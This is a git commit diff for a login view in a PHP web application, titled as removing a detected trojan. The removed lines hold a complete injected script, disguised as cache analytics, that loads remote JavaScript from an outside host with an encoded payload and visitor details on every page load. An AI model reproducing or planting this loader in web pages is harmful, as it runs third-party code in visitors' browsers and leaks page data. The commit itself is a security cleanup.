a888da77772bed22db5541ff1f4e779f90448127
Muhammad Fahru Rozi <m.fahruu.rozii@gmail.com>
2023-02-18 10:42:36 +0700

    Update login.php
    remove error trojan detected

--- application/views/auth/login.php
+++ application/views/auth/login.php
@@ -269,6 +269,6 @@
         });
     </script>
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX5GDjyssieIz3b3%2bbMpKhbLb536yqcznDwoUMz4apxRAxZnnClT2FDd5hcG2pQQmr9ruGR3SK4t49XRTvlkPmFagGv03%2bvDwrD5aMWwOWEQr3qb3cVbPmEyjsfwKok%2bvh6KCfx06FWvjnLXwCMW12wRB%2fj%2bj%2fu7MPB%2fYSxQ2T7%2faUqpGFN9dveYT0eoKLmaLZ%2bMD6L0ZNGUt469rUsKO%2fQEF2eN9WyEf3O8qBOZ7ih27r5pDsQ0W7Lw%2fZWPYodSef01HrGtfLpsvYjkVGsZPSDNYMfpUIj%2bOH4%2bXgb%2b6Xhqh8VpDyFCbYfrw%2flr4mKjrc%2fz5kW%2byX8wM5wlWxjgq9Ev2r4FKZH4A3OX%2fkJE5ZBR3tSQPaY6kX2NQYbN60KcS4RdXf%2fg5PmyoK7G0X0frl%2fIx%2bENghuYLD7tYQQRu%2fE4LKLrnYM%2bzhnEMmelZdo5J60wfw3bdnOLY1YFqmrh1PL%2fhV2U232HE6u88hNgq9LZKpBpz1pMWZ5rBqbLfL6yz8fm0IVHKVGFTptUWSGsdEj%2bj01Hzyqbqz%2fegBHKRyLmhi5%2f1W1nH2nWoQA8jtIbjy3YHgR5uzZTJfsYc%2b0T5kTxRaqyccwinf" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
 
 </html>
